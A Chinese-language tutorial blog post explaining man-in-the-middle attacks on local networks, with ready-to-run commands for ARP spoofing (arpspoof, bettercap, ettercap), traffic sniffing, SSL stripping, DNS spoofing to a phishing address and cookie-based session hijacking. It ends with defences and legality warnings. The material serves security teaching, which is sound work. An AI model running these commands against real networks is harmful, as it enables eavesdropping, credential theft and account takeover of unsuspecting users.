---
title: 中间人攻击与流量嗅探：局域网内的控制与窃听
slug: kali中间人攻击流量嗅探-f6g7h
date: 2026-08-30
visibility: public
tags: Kali Linux, 中间人攻击, ARP欺骗, 流量嗅探, Wireshark, 教程
---

# 中间人攻击与流量嗅探：局域网内的控制与窃听

> 中间人攻击（MitM）是局域网攻击的核心技术。通过 ARP 欺骗、DNS 欺骗、流量嗅探等手段，攻击者可以在用户无感知的情况下窃听、篡改甚至劫持网络通信。本文解析 MitM 原理与 Wireshark 抓包分析。

## 一、中间人攻击（MITM）原理

### 网络通信模型

正常通信：`主机A —— 网关 —— 目标服务器`

中间人攻击后：`主机A —— 攻击者 —— 网关 —— 目标服务器`

攻击者"插入"到通信链路中间，既能**窃听**也能**篡改**流量。

### ARP 欺骗（最经典）

ARP 协议将 IP 映射到 MAC。攻击者伪造 ARP 回应，把"网关的 IP"映射到**攻击者的 MAC**，于是所有发往网关的流量都先经过攻击者。

```
正常：A 的 ARP: 192.168.1.1 → 网关MAC
欺骗：攻击者广播 → 192.168.1.1 → 攻击者MAC
结果：A 的流量全部经过攻击者
```

## 二、工具与实战

### 1. Arpspoof（Kali 自带）

```bash
# 开启 IP 转发（让流量正常转发，否则目标断网）
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP 欺骗目标：告诉目标 网关MAC = 攻击者MAC
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
# 欺骗网关（告诉网关 目标MAC = 攻击者MAC）
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

### 2. Bettercap（功能强大的 MITM 框架）

```bash
# 启动（交互式）
sudo bettercap

# 自动侦察局域网
net.probe on
net.show

# 开启 ARP 欺骗
set arp.spoof.targets 192.168.1.100
arp.spoof on

# 开启嗅探
sniffer on
```

### 3. Wireshark 流量嗅探

```bash
# 启动
wireshark

# 抓包过滤
# 只抓 HTTP
tcp port 80
# 只抓 FTP 登录
tcp port 21
# 只抓 Telnet
tcp port 23

# 分析：找到 HTTP 请求中带明文密码的包
# Wireshark → Analyze → Follow TCP Stream
```

### 4. 中间人流量分析

```bash
# 在 ARP 欺骗 + IP 转发下
# 用 Wireshark / tcpdump 抓取中间流量
tcpdump -i eth0 -A 'tcp port 80 and host 192.168.1.100'

# 或使用：
# ettercap（中间人 + 插件）
ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//
```

## 三、更高级的 MITM

### 1. SSL 剥离（SSL Stripping）

HTTP → HTTPS 的降级攻击，把目标的 HTTPS 请求替换为 HTTP，从而窥视明文。

```bash
# 工具：sslstrip / bettercap 的 sslstrip
sudo sslstrip -l 8080
# 配合 ARP 欺骗
# 攻击者拦截 HTTP，转发给网关，但保持明文
```

### 2. DNS 欺骗

伪造 DNS 回应，把目标访问的域名解析到攻击者指定 IP（钓鱼页面）。

```bash
# dnsspoof
dnsspoof -i eth0 -f dnsmap.txt
# dnsmap.txt 中写入：
# 192.168.1.66 www.example.com
```

### 3. 会话劫持

```bash
# 用 Hamster + Ferret 抓取目标浏览器 Cookie
# 或通过 ARP 欺骗 + Wireshark 抓取会话 Cookie 直接替换
```

## 四、防御中间人攻击

| 手段 | 说明 |
|------|------|
| 全程 HTTPS | 加密传输，防止明文窃取 |
| 证书校验 | 不轻易信任新证书 |
| 开启 MFA | 即使窃取口令也无法登录 |
| 交换机绑定 | 端口安全 / 动态 ARP |
| 终端检测 | 防 ARP 欺骗软件 |

## 五、实操演练（合法环境）

```
实验环境：自己的局域网 / 靶场
1. 开启 IP 转发
2. arpspoof 欺骗目标与网关
3. Wireshark 抓取流量
4. 分析明文（HTTP/FTP/Telnet）
5. 记录，复盘如何防御
```

> 注意：在他人局域网内未经许可做 MITM 是违法的。

## 安全提醒

> 中间人攻击直接威胁隐私与账户安全。请仅在自己的测试环境中使用，或获得书面授权。防御上：全员 HTTPS、证书校验、终端 ARP 防护。

## 小结

- MITM 核心 = 把攻击者插入通信链路
- ARP 欺骗是最基础的 MitM 手段
- Bettercap 是功能强大的 MITM 框架
- Wireshark 抓包是分析流量、发现密码的关键
- 防御：HTTPS + 证书验证 + ARP 防护 + MFA

> 下一篇：Wireshark 协议分析与密码提取——从流量中还原"真相"。